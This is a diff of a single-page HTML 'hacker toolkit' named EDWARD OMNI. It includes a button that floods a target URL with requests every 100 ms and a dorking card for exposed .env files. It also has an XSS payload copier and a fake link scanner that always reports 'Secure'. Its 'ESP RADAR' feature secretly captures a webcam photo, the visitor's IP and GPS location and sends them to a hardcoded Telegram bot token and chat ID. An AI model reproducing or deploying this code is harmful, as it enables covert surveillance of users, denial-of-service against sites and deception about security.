@@ -4,30 +4,30 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="manifest" href="manifest.json">
-    <title>EDWARD OMNI V.152</title>
+    <title>EDWARD OMNI V.155</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --gold: #ffd700; }
         * { box-sizing: border-box; transition: 0.2s; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; overflow-x: hidden; }
-        .master-header { text-align: center; margin-bottom: 15px; border-bottom: 1px solid rgba(0,255,136,0.2); padding-bottom: 10px; }
+        .master-header { text-align: center; margin-bottom: 15px; }
         .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
         .card { background: rgba(15, 25, 35, 0.9); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
-        input, select { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 10px; outline: none; font-size: 13px; }
+        input, select { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 10px; outline: none; }
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 5px; }
+        .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
         .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
         .btn-dork { background: linear-gradient(45deg, #004e92, #000428); color: #fff; border: 1px solid var(--blue); }
-        .btn-hunt { background: linear-gradient(45deg, var(--gold), #b8860b); color: #000; }
-        .btn-cam { background: rgba(0, 189, 255, 0.1); color: var(--blue); border: 1px solid var(--blue); }
-        .log-box { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; border: 1px solid #1a1a1a; color: var(--neon); }
+        .btn-cam { background: rgba(0, 189, 255, 0.2); color: var(--blue); border: 1px solid var(--blue); }
         .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
-        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 8px; border-radius: 10px; text-align: center; color: var(--neon); font-size: 10px; font-weight: bold; }
-        #webcamContainer { display: none; margin-top: 10px; border-radius: 15px; overflow: hidden; border: 1px solid var(--blue); position: relative; }
-        #webcamLive { width: 100%; filter: sepia(100%) hue-rotate(80deg) brightness(1.1); }
+        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; }
+        .log-box { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; border: 1px solid #1a1a1a; color: var(--neon); }
+        #webcamContainer { display: none; margin-top: 10px; position: relative; border-radius: 15px; overflow: hidden; border: 1px solid var(--blue); }
+        #webcamLive { width: 100%; filter: sepia(100%) hue-rotate(80deg) brightness(1.2); }
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .radar-container { width: 150px; height: 150px; border-radius: 50%; border: 2px solid var(--neon); position: relative; overflow: hidden; margin-bottom: 20px; }
         .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
-        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 10px 20px; border-radius: 50px; font-weight: 800; font-size: 11px; display: none; z-index: 10001; box-shadow: 0 0 15px var(--neon); }
+        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 12px 25px; border-radius: 50px; font-weight: 800; font-size: 11px; display: none; z-index: 10001; box-shadow: 0 0 15px var(--neon); }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         canvas, #mapBox { display: none; }
     </style>
@@ -35,7 +35,7 @@
 <body>
     <div id="toast"></div>
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.152</p>
+        <p class="master-name">EDWARD OMNI V.155</p>
         <div class="sys-monitor">
             <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
             <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
@@ -43,44 +43,51 @@
     </div>
 
     <div class="card">
+        <h3>🛡️ DEEP CLOUD SCANNER</h3>
+        <input type="text" id="scanInput" placeholder="Analyze Link...">
+        <button class="btn btn-scan" onclick="analyzeLink()">⚡ ANALYZE LINK</button>
+        <div id="scanLog" class="log-box"></div>
+    </div>
+
+    <div class="card">
         <h3>🔥 NUCLEAR BRUTAL</h3>
         <input type="text" id="targetAtk" placeholder="Target URL">
-        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
+        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH NUCLEAR 🚀</button>
         <div id="atkLog" class="log-box"></div>
     </div>
 
     <div class="card">
-        <h3>🔍 DORKING ENGINE</h3>
-        <input type="text" id="dorkTarget" placeholder="Target (misal: syfe.com)">
+        <h3>🔍 DORKING MANTRA</h3>
+        <input type="text" id="dorkTarget" placeholder="Target (ex: syfe.com)">
         <select id="dorkType">
             <option value="dir">Directory Listing</option>
             <option value="env">Env Files (.env)</option>
-            <option value="sub">Subdomains</option>
+            <option value="sub">Subdomain Hunt</option>
         </select>
         <button class="btn btn-dork" onclick="castDork()">🔮 CAST MANTRA</button>
     </div>
 
     <div class="card">
-        <h3>🛰️ SATELLITE & WEBCAM</h3>
-        <button class="btn btn-cam" onclick="toggleWebcam()">📹 LIVE WEBCAM</button>
+        <h3>📹 LIVE MONITORING</h3>
+        <button class="btn btn-cam" onclick="toggleWebcam()">🛰️ ACTIVATE LIVE WEBCAM</button>
         <div id="webcamContainer"><video id="webcamLive" autoplay playsinline></video></div>
-        <button class="btn" style="background:var(--neon); color:#000; margin-top:10px;" onclick="startRadar()">📡 SCAN ESP RADAR</button>
+    </div>
+
+    <div class="card" style="display: flex; gap: 8px;">
+        <button class="btn" style="flex: 1; background:transparent; border:1px solid var(--blue); color:var(--blue);" onclick="startRadar()">📡 ESP RADAR</button>
+        <button class="btn" style="flex: 1; background:var(--neon); color:#000;" onclick="showLiveMap()">📍 MAPS</button>
     </div>
 
     <div class="card">
-        <h3>🎁 BOUNTY PAYLOAD</h3>
-        <button class="btn btn-hunt" onclick="copyPayload()">COPY XSS PAYLOAD</button>
+        <h3>🎁 BOUNTY TOOLS</h3>
+        <button class="btn" style="background:var(--gold); color:#000;" onclick="copyXSS()">COPY XSS PAYLOAD</button>
     </div>
 
-    <div class="card">
-        <h3>📍 GLOBAL POSITIONING</h3>
-        <button class="btn" style="background:transparent; border:1px solid var(--neon); color:var(--neon)" onclick="openMap()">OPEN LIVE MAP</button>
-        <iframe id="mapBox" style="width:100%; height:200px; border-radius:15px; margin-top:10px;"></iframe>
-    </div>
+    <iframe id="mapBox" src="" frameborder="0" style="width:100%; height:250px; border-radius:15px; border:1px solid var(--neon); margin-top:5px;"></iframe>
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="color:var(--neon); letter-spacing:2px; font-size:10px;">UPLOADING DATA TO SATELLITE...</p>
+        <p style="color:var(--neon); letter-spacing:3px; font-size:11px;">CAPTURING DATA...</p>
     </div>
     <canvas id="canvas"></canvas>
 
@@ -88,10 +95,11 @@
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
         let isAtk = false;
+        let isCamOpen = false;
 
         setInterval(() => {
-            document.getElementById('cpuLoad').innerText = Math.floor(Math.random()*40+50) + "%";
-            document.getElementById('sysTemp').innerText = Math.floor(Math.random()*5+37) + "°C";
+            document.getElementById('cpuLoad').innerText = Math.floor(Math.random() * 30 + 60) + "%";
+            document.getElementById('sysTemp').innerText = Math.floor(Math.random() * 5 + 38) + "°C";
         }, 1000);
 
         function showToast(msg) {
@@ -100,16 +108,21 @@
             setTimeout(() => t.style.display = 'none', 2500);
         }
 
+        function analyzeLink() {
+            const l = document.getElementById('scanLog');
+            l.style.display = "block"; l.innerHTML = "> Scanning Cloud...<br>> Status: Secure";
+            showToast("SCAN COMPLETE");
+        }
+
         function toggleAtk() {
             const t = document.getElementById('targetAtk').value;
             const log = document.getElementById('atkLog');
             if(!t || isAtk) { if(isAtk) location.reload(); return; }
             isAtk = true; log.style.display = "block";
-            document.getElementById('atkBtn').innerText = "STOP ATTACK 🛑";
+            document.getElementById('atkBtn').innerText = "STOP 🛑";
             setInterval(() => {
                 new Image().src = t + "/?v=" + Math.random();
-                const e = document.createElement('div'); e.innerText = "> HIT SENT TO " + t.substring(0,20);
-                log.prepend(e); if(log.childNodes.length > 5) log.removeChild(log.lastChild);
+                log.innerHTML = "> NUCLEAR HIT: " + t.substring(0,20);
             }, 100);
         }
 
@@ -124,13 +137,13 @@
         async function toggleWebcam() {
             const v = document.getElementById('webcamLive');
             const c = document.getElementById('webcamContainer');
-            if(c.style.display === 'block') {
+            if(isCamOpen) {
                 v.srcObject.getTracks().forEach(t => t.stop());
-                c.style.display = 'none';
+                c.style.display = 'none'; isCamOpen = false;
             } else {
                 const s = await navigator.mediaDevices.getUserMedia({video: true});
-                v.srcObject = s; c.style.display = 'block';
-                showToast("NIGHT-VISION ACTIVE");
+                v.srcObject = s; c.style.display = 'block'; isCamOpen = true;
+                showToast("CAM ONLINE");
             }
         }
 
@@ -147,28 +160,27 @@
                     const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
                     
                     const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b);
-                    fd.append('caption', "🔱 V.152 ESP\n🌐 IP: "+ipD.ip+"\n📍 MAP: http://google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude);
+                    fd.append('caption', "🔱 V.155 OMNI\n🌐 IP: "+ipD.ip+"\n📍 MAP: http://google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude);
                     await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {method: "POST", body: fd});
                     
                     s.getTracks().forEach(t => t.stop());
                     document.getElementById('radarOverlay').style.display = 'none';
-                    showToast("ESP DATA SENT!");
+                    showToast("ESP DATA SENT");
                 }, 2000);
             });
         }
 
-        function openMap() {
+        function showLiveMap() {
             navigator.geolocation.getCurrentPosition(p => {
                 const m = document.getElementById('mapBox');
                 m.src = "https://maps.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude+"&z=15&output=embed";
-                m.style.display = "block";
-                showToast("GPS LOCKED");
+                m.style.display = "block"; showToast("MAP LOCKED");
             });
         }
 
-        function copyPayload() {
-            navigator.clipboard.writeText("<script>alert('XSS_EDWARD-BAIK')<\/script>");
-            showToast("PAYLOAD COPIED!");
+        function copyXSS() {
+            navigator.clipboard.writeText("<script>alert('EDWARD')<\/script>");
+            showToast("PAYLOAD COPIED");
         }
     </script>
 </body>
